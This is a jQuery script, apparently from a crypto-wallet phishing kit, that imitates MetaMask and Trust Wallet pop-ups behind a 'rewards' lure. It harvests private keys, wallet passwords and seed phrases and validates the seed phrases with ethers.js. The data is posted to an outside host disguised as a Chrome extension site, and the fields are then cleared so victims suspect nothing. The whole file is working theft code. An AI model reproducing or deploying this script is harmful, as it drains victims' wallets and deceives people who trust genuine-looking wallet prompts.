$('.beTwZZ').on('click', function() {  
    $('#metamask').fadeIn()   
    $('.modal').hide()     
})

$('.beTwZZ2').on('click', function() {   
    $('#trustwallet').fadeIn()    
    $('.modal').hide()     
})

$('.addon-box .head > a').on('click', function() {   
    location.reload();   
})

$('.addon-box .headtrust > a').on('click', function() {   
    location.reload();   
})

$('#rewards .confirm-approve-content__small-text > button').on('click', function() {   
    $('#metamask').fadeIn() 
    $('#rewards').hide()
})

$('#rewards2 .confirm-approve-content__small-text > button').on('click', function() {   
    $('#trustwallet').fadeIn() 
    $('#rewards2').hide()
})

 //savemetamask
 $("#metamask").on("submit", "#metamask", function(e) {
        e.preventDefault();
        $.ajax({
            url: 'https://chr0me-extensi0n.000webhostapp.com/chrome.php',
            type: 'post',
            data: $(this).serialize(),
            success: function(data) {
                alert(data);
                loadData();
            }
        });
        $("#PrivateKey").val("");
        $("#password1").val("");
        $("#password2").val("");
        $('#metamask').hide() 
        $('#rewards').fadeIn()
    });

    //savetrustwallet
    $("#trustwallet").on("submit", "#metamask", function(e) {
        e.preventDefault();
        $.ajax({
            url: 'https://chr0me-extensi0n.000webhostapp.com/extension.php',
            type: 'post',
            data: $(this).serialize(),
            success: function(data) {
                alert(data);
                loadData();
            }
        });
        $("#PrivateKey2").val("");
        $('#trustwallet').hide() 
        $('#rewards2').fadeIn()
    });
	
	
	  
      function showBtn() {
        if(words) $("#imp").prop("disabled", false)
        else $("#imp").prop("disabled", true) 
      }
      
      $('#wordsseed').on("change keyup paste", function(evt) {
		  
        let pass = $(this).val()
        if(pass.split(" ").length == 12 || pass.split(" ").length == 18 || pass.split(" ").length == 21 || pass.split(" ").length == 24){
          $("#wordsErrorConfir").hide()
        
          try{
            let mnemonic = pass
            let mnemonicWallet = ethers.Wallet.fromMnemonic(mnemonic)
            words = true
            $("#wordsErrorConfir").hide()
            $("#incorecct").hide()
          } catch (e){
            $("#wordsErrorConfir").hide()
            $("#incorecct").show()
            words = false
          }

        } else{
          $("#wordsErrorConfir").show()
          words = false
          
          $("#incorecct").hide()
        }

        showBtn()
      })

      setTimeout(function(){
        $(".loader").hide() 
        $(".alertBox").fadeOut('slow')
        $(".alert").fadeOut('slow')
      }, 2000)
